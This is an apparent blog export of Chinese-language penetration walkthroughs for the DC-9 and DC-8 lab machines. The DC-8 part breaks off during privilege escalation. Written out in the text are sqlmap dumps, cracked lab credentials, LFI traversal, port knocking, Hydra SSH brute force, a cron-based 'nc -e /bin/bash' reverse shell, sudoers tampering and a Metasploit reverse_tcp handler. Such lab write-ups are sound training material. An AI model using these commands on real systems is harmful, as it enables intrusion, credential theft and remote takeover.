+<h1><span id="dc-9-靶机渗透">DC-9 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li><p>初期脚本扫描</p>
+</li>
+<li><p>扫描结果</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505133218228.png" alt="image-20200505133218228"></p>
+</li>
+<li><p>可以发现 ip地址为：<code>192.168.0.114</code> ssh (但是ssh无法访问了) 和 http服务s</p>
+</li>
+<li><p>但是没有其他可用的信息 </p>
+</li>
+<li><p>爆破一下目录</p>
+</li>
+<li><p>我这里用御剑爆破</p>
+</li>
+<li><p>输入url： <a href="http://192.168.0.114" target="_blank" rel="noopener">http://192.168.0.114</a></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505135003390.png" alt="image-20200505135003390"></p>
+</li>
+<li><p>访问 <a href="http://192.168.0.114/index.php" target="_blank" rel="noopener">http://192.168.0.114/index.php</a> 是一个员工信息的主页</p>
+</li>
+<li><p>search.php 有一个搜索框。admin.php。是一个登陆界面</p>
+</li>
+<li><p>逐个fuzzing一下Sql注入</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505133904515.png" alt="image-20200505133904515"></p>
+</li>
+<li><p>可以发现存在sql注入</p>
+</li>
+<li><p>那就直接列表名</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505134248401.png" alt="image-20200505134248401"></p>
+</li>
+<li><p>列出User表的字段</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505134512164.png" alt="image-20200505134512164"></p>
+</li>
+<li><p>列出UserID，Username，Password字段的数据</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505134659369.png" alt="image-20200505134659369"></p>
+</li>
+<li><p>得到账号密码：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin <span class="string">'856f5de590ef37314e7c3bdf6f8a66dc'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>密码是MD5的拿去破解一下</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505134842141.png" alt="image-20200505134842141"></p>
+</li>
+<li><p>得到真正的账号密码 <code>admin : transorbital1</code></p>
+</li>
+<li><p>再用sqlmap跑跑其他数据库</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql --dbs  //information_schema，Staff，还有一个新表users</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -tables    	//UserDetails</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -T UserDetails --columns 		//firstname,id,lastname,password,reg_date,username</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -T UserDetails -C id,firstname,lastname,password --dump</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到一堆密码</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505154932928.png" alt="image-20200505154932928"></p>
+</li>
+<li><p>先把他放到字典里，等下用来爆破用</p>
+</li>
+<li><p>登陆之后再welcome.php的下面看到<code>File does not exist</code></p>
+</li>
+<li><p>可能有LFI</p>
+</li>
+<li><p>使用<code>burpsuite</code>进行FUZZ</p>
+</li>
+<li><p>可以看到<code>/etc/passwd</code></p>
+</li>
+<li><p>提取用户名：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>本想用包含访问日志的，但是并不能包含访问日志，只能试试爆破SSH,但是SSH被过滤了</p>
+</li>
+<li><p>最后百度一大堆…</p>
+</li>
+<li><p>终于<a href="https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html</a></p>
+</li>
+<li><p>知道<code>/etc/knockd.conf</code>也许能解开22端口</p>
+</li>
+<li><p>在<a href="http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf" target="_blank" rel="noopener">http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf</a></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505154709439.png" alt="image-20200505154709439"></p>
+</li>
+<li><p>得到ssh防御策略</p>
+</li>
+<li><p>意思是依次访问 7469,8475,9842端口就能解开22端口</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.0.114 7469</span><br><span class="line">nc 192.168.0.114 8475</span><br><span class="line">nc 192.168.0.114 9842</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后再用 <code>Hydra</code>爆破ssh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P result.txt -t 4 ssh://192.168.0.114</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到3个用户名密码</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505155536834.png" alt="image-20200505155536834"></p>
+</li>
+<li><p>登录进去看看呗</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh chandlerb@192.168.0.114   	&gt;&gt; UrAG0D!</span><br><span class="line">ssh joeyt@192.168.0.114			&gt;&gt; Passw0rd</span><br><span class="line">ssh janitor@192.168.0.114		&gt;&gt; Ilovepeepee</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>都看了看，发现只有 <code>janitor</code>用户下有个有用的东西</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505154228962.png" alt="image-20200505154228962"></p>
+</li>
+<li><p>这里又有几个密码，做成字典爆破其他用户</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pwd.txt -t 6 ssh://192.168.0.114</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200505160203999.png" alt="image-20200505160203999"></p>
+</li>
+<li><p>然后我们登录<code>fredf</code>用户</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh fredf@192.168.0.114		&gt;&gt; B4-Tru3-001</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200505160402623.png" alt="image-20200505160402623"></p>
+</li>
+<li><p>发现 <code>/opt/devstuff/dist/test/test</code> 可以不用root密码执行</p>
+</li>
+<li><p>发现这是一个python打包好的程序</p>
+</li>
+<li><p>python文件在<code>/opt/devstuff/test.py</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fredf@dc<span class="number">-9</span>:/opt/devstuff$ </span><br><span class="line">    cat test.py</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Usage: python test.py read append"</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[<span class="number">2</span>], <span class="string">"a"</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>读取第一个参数的文件添加到第二个文件的里面</p>
+</li>
+<li><p>可以利用计划任务来反弹shell</p>
+</li>
+<li><p>先看看计划任务</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">17 *    * * * root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * * root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7 root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * * root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>先在/tmp目录下写上</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'*/1 * * * * root nc -e /bin/bash 192.168.0.21 8899'</span> &gt; /tmp/crontab-</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200505161858371.png" alt="image-20200505161858371"></p>
+</li>
+<li><p>然后kali监听好，等一小会就能得到root权限了</p>
+</li>
+<li><p>等了半天发现没反应~，原来是没有nc</p>
+</li>
+<li><p>那就通过<code>/etc/sudoers</code>文件来给当前用户root权限</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'fredf    ALL=(ALL:ALL) ALL'</span> &gt; /tmp/sudo-</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200505162742825.png" alt="image-20200505162742825"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200505162841981.png" alt="image-20200505162841981"></p>
+</li>
+<li><p>就完成了<del>~</del></p>
+<h2><span id="the_end"><strong>THE_END!</strong></span></h2></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-8 靶机渗透</title>
+    <url>/DC-8/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-8-靶机渗透">DC-8 靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+<li><a href="#__the_end__"><strong>THE_END!</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+<h1><span id="dc-8-靶机渗透">DC-8 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li>今天我们用一个脚本来做前期的扫描</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> commands <span class="keyword">as</span> cmd</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">color = &#123;</span><br><span class="line">    <span class="string">'black'</span> :   <span class="string">'\033[30m'</span>,</span><br><span class="line">    <span class="string">'red'</span>   :   <span class="string">'\033[31m'</span>,</span><br><span class="line">    <span class="string">'green'</span> :   <span class="string">'\033[32m'</span>,</span><br><span class="line">    <span class="string">'yellow'</span>:   <span class="string">'\033[33m'</span>,</span><br><span class="line">    <span class="string">'blue'</span>  :   <span class="string">'\033[34m'</span>,</span><br><span class="line">    <span class="string">'purple'</span>:   <span class="string">'\033[35m'</span>,</span><br><span class="line">    <span class="string">'suffix'</span>:   <span class="string">'\033[0m'</span></span><br><span class="line">&#125;</span><br><span class="line">result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_color</span><span class="params">(s, c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> color.keys():</span><br><span class="line">        <span class="keyword">return</span> color[c] + s + color[<span class="string">'suffix'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_adder</span><span class="params">(addr)</span>:</span></span><br><span class="line">    compile_ip = re.compile(</span><br><span class="line">        <span class="string">r'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(addr):</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cmd.getoutput(<span class="string">"arp-scan --interface eth0 192.168.0.0/24 | grep VMware | awk '&#123;print $1&#125;'"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_adders</span><span class="params">()</span>:</span></span><br><span class="line">    adders = scan_addr().split(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(adders) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> adders: print(add_color(<span class="string">'[*] IP address found:&#123;&#125;'</span>.format(addr), <span class="string">'blue'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] No IP address found!'</span>, <span class="string">'yellow'</span>))</span><br><span class="line">        input_addr = input(<span class="string">'Please enter the IP address manually. Multiple IP addresses are separated by ","'</span>)</span><br><span class="line">        adders = [check_adder(addr) <span class="keyword">for</span> addr <span class="keyword">in</span> input_addr.split(<span class="string">','</span>)]</span><br><span class="line">    <span class="keyword">return</span> adders</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> check_adder(addr):</span><br><span class="line">        print(add_color(<span class="string">'[*] Start scanning port of &#123;&#125; ...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">        result[<span class="string">'nmap'</span>] = cmd.getoutput(<span class="string">"nmap -sS -A -p- &#123;&#125;"</span>.format(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nikto_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web Services of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(addr))</span><br><span class="line">    errors = re.findall(<span class="string">r'No web server found'</span>, res)</span><br><span class="line">    <span class="keyword">if</span> len(errors) &gt; <span class="number">0</span>:</span><br><span class="line">        print(add_color(<span class="string">'[!] An error was encountered while scanning the Host:&#123;&#125;:80.'</span>.format(addr), <span class="string">'red'</span>))</span><br><span class="line">        host = input(<span class="string">'Please enter the correct URL:\n'</span>)</span><br><span class="line">        res = cmd.getoutput(<span class="string">"nikto -host &#123;&#125;"</span>.format(host))</span><br><span class="line">    result[<span class="string">'nikto'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whatweb_scan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    print(add_color(<span class="string">'[*] Start scanning Web information of &#123;&#125;...'</span>.format(addr), <span class="string">'yellow'</span>))</span><br><span class="line">    cs = cmd.getoutput(<span class="string">"whatweb &#123;&#125;"</span>.format(addr))</span><br><span class="line">    _r = re.sub(<span class="string">r'\033\[\d&#123;1,2&#125;m'</span>, <span class="string">''</span>, cs)</span><br><span class="line">    res = _r.split(<span class="string">','</span>)</span><br><span class="line">    ls = [res[<span class="number">-4</span>], res[<span class="number">-3</span>], res[<span class="number">-2</span>]]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">del</span> res[<span class="number">-2</span>]</span><br><span class="line">    res.append(<span class="string">','</span>.join(ls))</span><br><span class="line">    result[<span class="string">'whatweb'</span>] = res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入输出结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_result</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ld = [<span class="string">'&gt;&gt;&gt;'</span>, <span class="string">'Language'</span>, <span class="string">'Country'</span>, <span class="string">'Framework'</span>, <span class="string">'Server'</span>, <span class="string">'IP'</span>, <span class="string">'JsFWK'</span>, <span class="string">'MetaGenerator'</span>, <span class="string">'ScriptType'</span>, <span class="string">'Title'</span>,</span><br><span class="line">          <span class="string">'XFO'</span>, <span class="string">'UH'</span>]</span><br><span class="line">    threads = list()</span><br><span class="line">    threads.append(threading.Thread(target=scan_port, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=nikto_scan, args=(addr,)))</span><br><span class="line">    threads.append(threading.Thread(target=whatweb_scan, args=(addr,)))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.join()</span><br><span class="line"></span><br><span class="line">    style = <span class="string">'style="background-color:#000;color:#0F0;width:96%;padding:2%;border:2px double #2F2;"'</span></span><br><span class="line">    html = <span class="string">r"""&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html style="background-color:#000; color:#FFF;"&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Auto-Scan&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="utf-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body style="font-size:120%;"&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; &lt;h1&gt;Auto-Scan Report - [&#123;ip&#125;]&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-Port&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sp&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&#123;sw&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt;&lt;h3&gt;Scan-WebServer&lt;/h3&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string"> &lt;pre &#123;sy&#125;&gt;&lt;table&gt;</span></span><br><span class="line"><span class="string">    &lt;tbody&gt;</span></span><br><span class="line"><span class="string">        &#123;sww&#125;</span></span><br><span class="line"><span class="string">    &lt;/tbody&gt;</span></span><br><span class="line"><span class="string"> &lt;/table&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string"> &lt;center&gt; All Rights Reserved &amp;copy; &lt;strong&gt;Auto-Scan&lt;/strong&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;"""</span>.format(ip=addr,</span><br><span class="line">                  sy=style,</span><br><span class="line">                  sp=result[<span class="string">'nmap'</span>],</span><br><span class="line">                  sw=result[<span class="string">'nikto'</span>],</span><br><span class="line">                  sww=<span class="string">''</span>.join([<span class="string">'&lt;tr&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#125;&lt;/td&gt;&lt;/tr&gt;'</span>.</span><br><span class="line">                              format(ld[i], result[<span class="string">'whatweb'</span>][i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(result[<span class="string">'whatweb'</span>]))]))</span><br><span class="line">    _dir = <span class="string">'Auto-Scan'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(_dir):</span><br><span class="line">        os.mkdir(_dir, <span class="number">0o755</span>)</span><br><span class="line">    fd = open(<span class="string">'&#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'w'</span>)</span><br><span class="line">    fd.write(html)</span><br><span class="line">    fd.flush()</span><br><span class="line">    fd.close()</span><br><span class="line">    print(add_color(<span class="string">'[+] IP address:&#123;ip&#125; scan completed, the results are saved in: &#123;dir&#125;/&#123;ip&#125;.html'</span>.format(dir=_dir, ip=addr), <span class="string">'green'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">'win'</span>):</span><br><span class="line">        print(add_color(<span class="string">'[-] This script can only be executed under Linux!'</span>, <span class="string">'red'</span>))</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    banner = <span class="string">r"""</span></span><br><span class="line"><span class="string">                 _                 _____</span></span><br><span class="line"><span class="string">    /\          | |               / ____|</span></span><br><span class="line"><span class="string">   /  \   _   _ | |_  ___  ______| (___    ___  __ _  _ __   _ __    ___  _ __</span></span><br><span class="line"><span class="string">  / /\ \ | | | || __|/ _ \|______|\___ \  / __|/ _` || '_ \ | '_ \  / _ \| '__|</span></span><br><span class="line"><span class="string"> / ____ \| |_| || |_| (_) |       ____) || (__| (_| || | | || | | ||  __/| |</span></span><br><span class="line"><span class="string">/_/    \_\\__,_| \__|\___/       |_____/  \___|\__,_||_| |_||_| |_| \___||_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#123;&#125;: &#123;&#125;</span></span><br><span class="line"><span class="string">    """</span>.format(add_color(<span class="string">'Author'</span>, <span class="string">'yellow'</span>), add_color(<span class="string">'@Rex_Surprise'</span>, <span class="string">'blue'</span>))</span><br><span class="line">    print(add_color(banner, <span class="string">'purple'</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> get_adders():threading.Thread(target=write_result, args=(addr,)).start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(add_color(e, <span class="string">'red'</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>直接执行脚本就完成了<code>ip发现</code>、<code>端口扫描</code>和<code>nikto扫描</code></p>
+</li>
+<li><p>扫描结果：</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503173049526.png" alt="image-20200504221620693"></p>
+</li>
+<li><p>从扫描结果可以看到，IP地址为：<code>192.168.0.29</code> 开放的端口只有 22 和 80</p>
+</li>
+<li><p>然后扫描了Web服务，发现是一个Drupal框架版本是Drupal 7</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索一下框架漏洞</span></span><br><span class="line">searchsploit Drupal 7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>啥也没有，直接去网页看看吧~</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发现这里有个nid比较刺眼</span></span><br><span class="line">http://192.168.0.29/?nid=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>点一个文章nid就变一下，可能有sql输入</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sqlmap 跑起来</span></span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 --dbms mysql --dbs</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db --tables</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users --column</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"><span class="comment"># 依次执行上面的之后就能得到以下结果</span></span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john  | <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>把上面的结果写到一个文件里面，然后使用 <code>Johnny</code> 把文件导入进去</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224312509.png" alt="image-20200504224312509"></p>
+</li>
+<li><p>这里值只看了john的密码: <code>turtle</code></p>
+</li>
+<li><p>然后我们就能去登录后台试试</p>
+</li>
+<li><p>Drupal的后台默认在/user/login下</p>
+</li>
+<li><p>直接访问：<a href="http://192.168.0.29/user/login，账号" target="_blank" rel="noopener">http://192.168.0.29/user/login，账号</a> <code>john</code> 密码 <code>turtle</code></p>
+</li>
+<li><p>然后就登录进去了</p>
+</li>
+<li><p>拿shell</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224920158.png" alt="image-20200504224920158"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504224947210.png" alt="image-20200504224947210"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225005560.png" alt="image-20200504225005560"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225051840.png" alt="image-20200504225051840"></p>
+</li>
+<li><p>我这里用的是<code>metasploit</code></p>
+</li>
+<li><p>先 <code>msfconsole</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.0.21</span><br><span class="line">LHOST =&gt; 192.168.0.21</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.21:4444</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后到网站去提交一个留言</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504225740483.png" alt="image-20200504225740483"></p>
+</li>
+<li><p>msf就得到了会话</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>就可以进到shell了</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获得标准shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line"><span class="comment"># 然后找其他用户看看是否有什么发现</span></span><br><span class="line"><span class="built_in">cd</span> /home;ls</span><br><span class="line">dc8user</span><br><span class="line">ls -l dc8user</span><br><span class="line"><span class="comment"># 啥也没有</span></span><br><span class="line"><span class="comment"># 然后使用</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 找suid的文件提权，结果如下：</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200504230239506.png" alt="image-20200504230239506"></p>
+</li>
